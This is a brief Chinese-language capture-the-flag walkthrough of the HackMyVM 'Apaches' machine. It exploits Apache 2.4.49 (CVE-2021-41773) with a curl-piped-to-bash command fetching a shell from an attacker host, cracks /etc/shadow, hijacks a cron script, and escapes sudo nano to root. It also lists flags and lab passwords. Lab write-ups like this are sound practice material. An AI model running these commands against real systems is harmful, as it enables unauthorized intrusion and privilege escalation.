# Apaches

2025.03.26 https://hackmyvm.eu/machines/machine.php?vm=Apaches

[video](https://www.bilibili.com/video/BV1QroeYwEha/?spm_id_from=333.1387.upload.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

22 和 80

发现 Apache/2.4.49 有 RCE 漏洞 CVE-2021-41773 ：

```
searchsploit -m 50383
./50383.sh targets.txt /bin/bash 'curl http://192.168.5.3/shell/5.3/8888.sh|bash'
```

拿到 shell，发现/etc/shadow 可读，john 进行破解，发现用户凭据 squanto:iamtheone 登陆

crontab 中有一个注释是一个暗示，pspy 发现 sacagawea 用户 /bin/bash /home/sacagawea/Scripts/backup.sh 定时执行，当前用户同属 Lipan 组，有修改权限：

反弹后，拿到 user flag：

```
Flag: FlagsNeverQuitNeitherShouldYou
```

得到用户凭据：

```
~/Development/admin$ cat 2-check.php

 $users = [
    "geronimo" => "12u7D9@4IA9uBO4pX9#6jZ3456",
    "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl",
    "squanto" => "4Rl3^K8WDG@sG24Hq@ih",
    "sacagawea" => "cU21X8&uGswgYsL!raXC"
  ];
```

使用这个凭据可切换到 "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl"

sudo -l 显示 (geronimo) /bin/nano 还是需要切换到最后一个用户：

```
sudo -u geronimo nano
^R^X
reset; sh 1>&0 2>&0
```

执行后，sudo 有 ALL 权限，直接 sudo su 拿到 root flag：

```
Flag: OneSingleVulnerabilityAllAnAttackerNeeds
```
